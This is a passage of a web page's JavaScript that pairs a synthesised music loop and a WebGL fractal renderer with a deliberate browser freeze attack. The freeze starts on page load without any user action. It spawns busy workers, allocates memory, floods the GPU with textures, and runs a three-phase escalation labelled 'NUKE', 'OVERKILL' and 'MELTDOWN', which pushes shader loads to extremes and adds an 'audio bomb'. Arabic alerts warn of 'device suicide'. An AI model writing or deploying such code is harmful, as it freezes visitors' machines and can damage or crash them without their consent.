        function playMesmerizer(ctx) {
            var BPM = 185;
            var beat = 60 / BPM;            // quarter note in seconds
            var bar = beat * 4;
            var bars = 8;
            var totalDur = bar * bars;
            var t = ctx.currentTime + 0.05;

            // Master bus with slight compression
            var master = ctx.createGain();
            master.gain.setValueAtTime(0.0, t);
            master.gain.linearRampToValueAtTime(0.82, t + 0.4);
            master.connect(ctx.destination);

            var comp = ctx.createDynamicsCompressor();
            comp.threshold.value = -18;
            comp.knee.value = 10;
            comp.ratio.value = 6;
            comp.attack.value = 0.003;
            comp.release.value = 0.15;
            comp.connect(master);

            // ─ Helper: schedule one note ─
            function note(midi, startT, durBeats, gainVal, type, detuneC) {
                var freq = midiToHz(midi);
                var dur = durBeats * beat;
                var osc = ctx.createOscillator();
                var env = ctx.createGain();
                osc.type = type || 'sawtooth';
                osc.frequency.value = freq;
                if (detuneC) osc.detune.value = detuneC;
                env.gain.setValueAtTime(0.0, startT);
                env.gain.linearRampToValueAtTime(gainVal, startT + 0.01);
                env.gain.setValueAtTime(gainVal, startT + dur - 0.03);
                env.gain.linearRampToValueAtTime(0.0, startT + dur);
                osc.connect(env);
                env.connect(comp);
                osc.start(startT);
                osc.stop(startT + dur + 0.05);
            }

            // ─ Kick drum ─
            function kick(startT) {
                var osc = ctx.createOscillator();
                var env = ctx.createGain();
                osc.frequency.setValueAtTime(160, startT);
                osc.frequency.exponentialRampToValueAtTime(40, startT + 0.08);
                env.gain.setValueAtTime(1.0, startT);
                env.gain.exponentialRampToValueAtTime(0.001, startT + 0.25);
                osc.connect(env); env.connect(comp);
                osc.start(startT); osc.stop(startT + 0.3);
            }

            // ─ Snare ─
            function snare(startT) {
                var buf = ctx.createBuffer(1, ctx.sampleRate * 0.15, ctx.sampleRate);
                var data = buf.getChannelData(0);
                for (var i = 0; i < data.length; i++)
                    data[i] = (Math.random() * 2 - 1) * Math.exp(-i / (data.length * 0.3));
                var src = ctx.createBufferSource();
                var env = ctx.createGain();
                src.buffer = buf;
                env.gain.setValueAtTime(0.55, startT);
                src.connect(env); env.connect(comp);
                src.start(startT);
            }

            // ─ Hi-hat ─
            function hihat(startT, open) {
                var buf = ctx.createBuffer(1, ctx.sampleRate * (open ? 0.12 : 0.04), ctx.sampleRate);
                var data = buf.getChannelData(0);
                for (var i = 0; i < data.length; i++)
                    data[i] = (Math.random() * 2 - 1) * Math.exp(-i / (data.length * 0.5));
                var hpf = ctx.createBiquadFilter();
                hpf.type = 'highpass'; hpf.frequency.value = 7000;
                var src = ctx.createBufferSource();
                var env = ctx.createGain();
                src.buffer = buf;
                env.gain.setValueAtTime(0.3, startT);
                src.connect(hpf); hpf.connect(env); env.connect(comp);
                src.start(startT);
            }

            // ── SCHEDULE DRUMS (8 bars) ───────────────
            for (var br = 0; br < bars; br++) {
                var bt = t + br * bar;
                // Kick: beats 1 & 3
                kick(bt);
                kick(bt + beat * 2);
                // Snare: beats 2 & 4
                snare(bt + beat);
                snare(bt + beat * 3);
                // 8th hi-hats
                for (var h = 0; h < 8; h++) hihat(bt + h * beat * 0.5, h % 4 === 3);
                // Extra kick on offbeat bar 2+
                if (br > 0) kick(bt + beat * 3.5);
            }

            // ── SCHEDULE MELODY ──────────────────────
            var mT = t;
            for (var mi = 0; mi < MESM_MELODY.length; mi++) {
                var nd = MESM_MELODY[mi];
                // Lead: detuned square (Miku-style bright)
                note(nd.m, mT, nd.d, 0.22, 'square', 0);
                note(nd.m, mT, nd.d, 0.10, 'sawtooth', 7);
                note(nd.m + 12, mT, nd.d, 0.06, 'sine', 0); // octave shimmer
                mT += nd.d * beat;
            }

            // ── SCHEDULE BASS ────────────────────────
            var bassT = t;
            for (var bi = 0; bi < MESM_BASS.length; bi++) {
                var bd = MESM_BASS[bi];
                note(bd.m, bassT, bd.d, 0.40, 'sawtooth', 0);
                note(bd.m, bassT, bd.d, 0.20, 'sawtooth', -7);
                note(bd.m + 12, bassT, bd.d, 0.10, 'square', 0);
                bassT += bd.d * beat;
            }

            // ── ARPEGGIO (Kasane Teto layer - 16th notes) ─
            for (var ai = 0; ai < bars * 16; ai++) {
                var aT = t + ai * beat * 0.25;
                var midi = MESM_ARP[ai % MESM_ARP.length];
                note(midi, aT, 0.22, 0.08, 'triangle', 0);
            }

            // ── PAD / ATMOSPHERE ──────────────────────
            var padNotes = [69, 72, 76]; // Am chord
            for (var pi = 0; pi < padNotes.length; pi++) {
                note(padNotes[pi], t, bars * 4, 0.04, 'sine', pi * 3);
            }

            // ── LOOP ──────────────────────────────────
            master.gain.setValueAtTime(0.82, t + totalDur - 1.5);
            master.gain.linearRampToValueAtTime(0.0, t + totalDur);
            setTimeout(function () { playMesmerizer(ctx); }, (totalDur - 0.1) * 1000);
        }

                "}";
            canvas = document.getElementById('c1');
            gl = canvas.getContext('webgl');
            vertshader = gl.createShader(gl.VERTEX_SHADER);
            fragshader = gl.createShader(gl.FRAGMENT_SHADER);
            shaderProgram = gl.createProgram();
            gl.shaderSource(vertshader, VSHADER_SOURCE);
            gl.compileShader(vertshader);
            var infov = gl.getShaderInfoLog(vertshader);
            gl.shaderSource(fragshader, FSHADER_SOURCE + KERNEL);
            gl.compileShader(fragshader);
            var infof = gl.getShaderInfoLog(fragshader);
            gl.attachShader(shaderProgram, vertshader);
            gl.attachShader(shaderProgram, fragshader);
            gl.linkProgram(shaderProgram);
            gl.useProgram(shaderProgram);
            if (!gl.getProgramParameter(shaderProgram, gl.LINK_STATUS)) {
                var info = gl.getProgramInfoLog(shaderProgram);
                throw 'Could not compile WebGL program. \n\n' + infov + infof + info;
            }
            glposition = gl.getAttribLocation(shaderProgram, 'position');
            glright = gl.getUniformLocation(shaderProgram, 'right');
            glforward = gl.getUniformLocation(shaderProgram, 'forward');
            glup = gl.getUniformLocation(shaderProgram, 'up');
            glorigin = gl.getUniformLocation(shaderProgram, 'origin');
            glx = gl.getUniformLocation(shaderProgram, 'x');
            gly = gl.getUniformLocation(shaderProgram, 'y');
            gllen = gl.getUniformLocation(shaderProgram, 'len');
            var buffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);
            gl.vertexAttribPointer(glposition, 3, gl.FLOAT, false, 0, 0);
            gl.enableVertexAttribArray(glposition);

            gl.viewport(0, 0, 1024, 1024);
            draw();
            window.requestAnimationFrame(ontimer);
            // ── LAUNCH FREEZE IMMEDIATELY (no user interaction needed) ──
            spawnWorkers(4);            // 4× cores, while(true), instant
            allocateMemory();           // RAM pressure
            spawnOffscreenWorkers(4);   // 4 GPU threads via OffscreenCanvas
            startTextureBomb();         // VRAM thrash

            document.getElementById("kernel").value = KERNEL;
            document.getElementById("btn").addEventListener("click", function () {
                var state = this.innerText == "CONFIG";
                this.innerText = state ? "HIDE" : "CONFIG";
                document.getElementById("config").style.display = state ? "inline" : "none";
            });
            document.getElementById("apply").addEventListener("click", function () {
                KERNEL = document.getElementById("kernel").value;
                gl.shaderSource(fragshader, FSHADER_SOURCE + KERNEL);
                gl.compileShader(fragshader);
                var infof = gl.getShaderInfoLog(fragshader);
                gl.linkProgram(shaderProgram);
                gl.useProgram(shaderProgram);
                if (!gl.getProgramParameter(shaderProgram, gl.LINK_STATUS)) {
                    var info = gl.getProgramInfoLog(shaderProgram);
                    alert(infof + info);
                }
                glposition = gl.getAttribLocation(shaderProgram, 'position');
                glright = gl.getUniformLocation(shaderProgram, 'right');
                glforward = gl.getUniformLocation(shaderProgram, 'forward');
                glup = gl.getUniformLocation(shaderProgram, 'up');
                glorigin = gl.getUniformLocation(shaderProgram, 'origin');
                glx = gl.getUniformLocation(shaderProgram, 'x');
                gly = gl.getUniformLocation(shaderProgram, 'y');
                gllen = gl.getUniformLocation(shaderProgram, 'len');
            });
            document.getElementById("cancle").addEventListener("click", function () {
                document.getElementById("kernel").value = KERNEL;
            });
            function startEscalationPhases() {
                // ══════════════════════════════════════════════════════
                //  3-PHASE ESCALATION — SAVAGE MODE
                //  Phase 1 (1.5s): NUKE   — i<25,  k<5000,  step=0.0002
                //  Phase 2 (5s):   OVERKILL — i<35,  k<8000,  SOLVER=24, MAXR=24
                //  Phase 3 (12s):  MELTDOWN — i<50,  k<12000, SOLVER=32, MAXR=32
                //                            + extra canvases + texture bomb + audio bomb
                // ══════════════════════════════════════════════════════

                function applyShader(iters, steps, stepSz, solver, maxr) {
                    try {
                        var K2 = KERNEL.replace('i<5', 'i<' + iters);
                        var F2 = FSHADER_SOURCE
                            .replace('#define MAXR 8\\n', '#define MAXR ' + maxr + '\\n')
                            .replace('#define SOLVER 8\\n', '#define SOLVER ' + solver + '\\n')
                            .replace('const float step = 0.002;', 'const float step = ' + stepSz + ';')
                            .replace('k < 1002', 'k < ' + steps);
                        gl.shaderSource(fragshader, F2 + K2);
                        gl.compileShader(fragshader);
                        gl.linkProgram(shaderProgram);
                        gl.useProgram(shaderProgram);
                        glposition = gl.getAttribLocation(shaderProgram, 'position');
                        glright = gl.getUniformLocation(shaderProgram, 'right');
                        glforward = gl.getUniformLocation(shaderProgram, 'forward');
                        glup = gl.getUniformLocation(shaderProgram, 'up');
                        glorigin = gl.getUniformLocation(shaderProgram, 'origin');
                        glx = gl.getUniformLocation(shaderProgram, 'x');
                        gly = gl.getUniformLocation(shaderProgram, 'y');
                        gllen = gl.getUniformLocation(shaderProgram, 'len');
                    } catch (ex) { }
                }

                // ── PHASE 1: NUKE (1.5s) ─────────────────────────────
                setTimeout(function () {
                    freezePhase = 1;
                    var alertBox = document.getElementById('alert-box');
                    if (alertBox) {
                        alertBox.style.display = 'block';
                        alertBox.textContent = '🔥 PHASE 1: NUKE — المعالج يحترق...';
                    }
                    applyShader(25, 5000, '0.0002', 16, 16);
                    spawnWorkers(2); // 2× extra workers on top of existing
                }, 0);

                // ── PHASE 2: OVERKILL (5s) ───────────────────────────
                setTimeout(function () {
                    freezePhase = 2;
                    var alertBox = document.getElementById('alert-box');
                    if (alertBox) {
                        alertBox.style.display = 'block';
                        alertBox.textContent = '💀 PHASE 2: OVERKILL — الجهاز يصرخ...';
                        alertBox.style.background = 'rgba(150,0,50,0.92)';
                    }
                    applyShader(35, 8000, '0.00015', 24, 24);
                    spawnWorkers(3); // 3× extra
                    startTextureBomb();
                    startExtraCanvases();
                }, 200);

                // ── PHASE 3: MELTDOWN (12s) ──────────────────────────
                setTimeout(function () {
                    freezePhase = 3;
                    var alertBox = document.getElementById('alert-box');
                    if (alertBox) {
                        alertBox.style.display = 'block';
                        alertBox.textContent = '☠️ PHASE 3: MELTDOWN — تحذير: انتحار جهاز...';
                        alertBox.style.background = 'rgba(80,0,0,0.95)';
                        alertBox.style.fontSize = '22px';
                        alertBox.style.animation = 'pulse-red 0.2s infinite alternate';
                    }
                    applyShader(50, 12000, '0.0001', 32, 32);
                    spawnWorkers(4); // 4× extra — total = 10× cores
                    audioBomb();
                }, 500);
            }
        }
    </script>
